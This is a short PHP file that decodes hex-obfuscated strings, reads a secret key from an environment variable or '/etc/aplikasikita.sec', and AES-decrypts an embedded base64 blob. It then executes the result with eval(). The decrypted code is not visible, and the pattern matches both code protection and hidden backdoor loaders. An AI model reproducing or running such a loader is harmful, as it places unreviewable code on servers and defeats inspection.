<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XUDRtIVUBaAkzgqacpZ3Ag==');

$c=base64_decode(

'UE3JTVXU8KYT8e6wI/3BbSKyZuUSjRUarJYqJBWro9GK31Ukek5VdsWPbWlYZV6WDn9q/TIDJmU+' .
'jU4LHqDL1TsvWCzNtY1GTkJw/gXV0NxKXd9Gd/5ikLm/KaPj/lkLu0HKAiY+owM611oOEcT5wxnC' .
'ohYpAQyHbHVQIC/yZS63M1jKevZVPsnfELTvp2gBb/aAc4E1vNjPXlD0yFdrRccrYeHKXjixf2kB' .
'BS4mgg3cBH+dsF1ulF1xRVEuFuO2BaHzY49sCDqHdOqnKtvinB6V6K+MDm4uNmWVix6RbYkJ8YEr' .
'6gVptzVZ62MA7jrNPsyk2i910R4Kn030nkGKiSeWYLQSDYd6Qz4aev5ZttGXTrTFnIOmjyRIzTSE' .
'cMysf3+GBF2E9lKfhSYYth2CjTs1hwbexPGonO3c3jti1ncvmbpx10mySDI1c0bJ4B5OI7SLxklm' .
'ZbEgROBSIt5gCkEGUNG9pPHMTDQRv/VNM+0O5uqzaEM+35MNpAiyt1jryPuxtgJbP0ztzeOq99Rv' .
'q6IrdD7vxd76KVpp+klq8x8J0mejF6UWKLqPUUsdr12yOsBp3QBVPZtdEjkEmN3ibpdwj/mWsotK' .
'z8G4nUM/ZqS9q13Q0GSYZcvoHg6ElCZxj+Gsr51f5HVHktgVZBs5VVnerkL5Q9zvQFreqN7rre8f' .
'/xfTQvLVwkowIgHaLZnkxphmzyyuWOdygQ3SJgd6QGHfbz2MzcaaAsS7ORcZytD+WQ4oA8kRuMjR' .
'aoqk8PkDKOnqasMR0Be6z2vhwPqwuZL/LlLTIu9waNzGI52AQbfSAoZVTUa4dhbYfUlGGKgxTz/l' .
'cO9xa9Ofi7iWjN/lyBgWfMyCTPzoRL8hOkFGcm7notiWhRa31JTVz5wJd7qH72CIyVcqgMMJtIKF' .
'9TU63VWA5wSk1uLvYqRBeSyaEtkX+pGHhbyN3gDeilq/8Ex6Fc3aaTfQjtZc00abgV44iE/GEBmU' .
'JlR9dl95GTGg0V4n/Qc2/nMbLbSpsUblPyB04cbD1Cl4GbD7vHDBCg84fR87Vh80BRwBSHgsXGuz' .
'w4b4uUp8hbXOxhA9Ps+LuoqrF3Z42iOdgU55Q6ytqJ9XQY6R6D2rIK2wdZfGixeAFSnV4ROHCHfF' .
'aMzdXSsfbDbq5zXhsD6HLZ79gjlH63A+smD43lK1FIo0QUhF2Lt3miUKVP+IE8/0cJJcivU30B69' .
'ANzdfJj62aX7RwbBj3+Nhd+vGnaH/qUbZ7gvFrNCAGuIInhWe45gu0Qju+cTUQ/vQc2URxMYThnh' .
'7VvDjEcS0bKxf5yQeiQxBsOIUsehOgerR9N/V1eYOjb67levjlsIG+H9O5gOJvaMgYrYIDVt9d0r' .
'kneUwhf/UO2LRXMiSJ4DNHE8xFAlkyQnue0WO+s5t4sG0AdlwabiNzjk15w86fLeu/DaTIDMEpXw' .
'VGwxpJyS8Ma9wFFRWD1etKEwqLSM0MAzsC0Tp/dv0rpiE4at17W/+ndkQloGJhUhejXIAwQN5Jgy' .
'sEZC8et6e5MH5JieML6PVyDmJzyfNc+xKbxxKpugl79xBAvnWBlFAQjZwU5wElgU5a4y1+yj731b' .
'DAT6VBnhtx+4gecHDUmbrykgIgIF+Tt0czcu9U78LwLZAZRBwwCSHU6W8CdbrzQDoiCO9m58Nq+Y' .
'X8dMoJLfxROd2I0pHME7dTZ7ZK3w+dnUOtryrrJSqRLw/7bStxxTw7cSXQoY07LAfPl1XPNZoEIp' .
'G9IhXu+jvClwM8hIrs/ojQS6MfTxcpbs4kUcUD/YLCXQoIBO5LG6PKcx9uwJ8M+4yU5W21MJrK1G' .
'pGaPnhY+qlwwBcsmzK6uXwY89xJevlO/jT7yXeljBompNT4tUpGWMGirhGLsAxwcb3wlagEh4Wuw' .
'OvzJljxmSBol8qn9zDubM9ies01PBsIsaGL2cGrQgFdMNPD2vgY6razhiT5qnlLKXqeliRCqD6tF' .
'ukmwVfj+FNDLc7yu36ctpHbmogNNqs+aVU4I1OeSfjQLwPvXF1HdcZNtlyIs8GdX+S9UpQsgokM2' .
'xEKW/GUTHiAx3L7aFhSHrPvuwlyarETd7+jRoFFgCcIqVtBHQyO3KPUdYxk5+Dm3hXSC85FUAIJI' .
'Hwfz3q/nWlzt3GozOrG8mc+EBvr18HdpM4+Zvs+TnWCyYvnFZJ3voLIRj6j0+rfMmlmFQB2eMjrD' .
'L38iis+9jM43t1CDRRtHr5BDeswop0pUbsZn/dwaedqUJVFbWvmKnjB4E1/Ndwe0Z9YeL6Vb8NXu' .
'GM+nmXd8QMSVDSBxRPfujwooPoccUNJeGErAylByhTpT5VDCP8Ank0HEB04g1qvC+a4qI1mKHJGg' .
'rgUvIUm2AG7PtNnbHId9LpFybhrR1X3zHg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

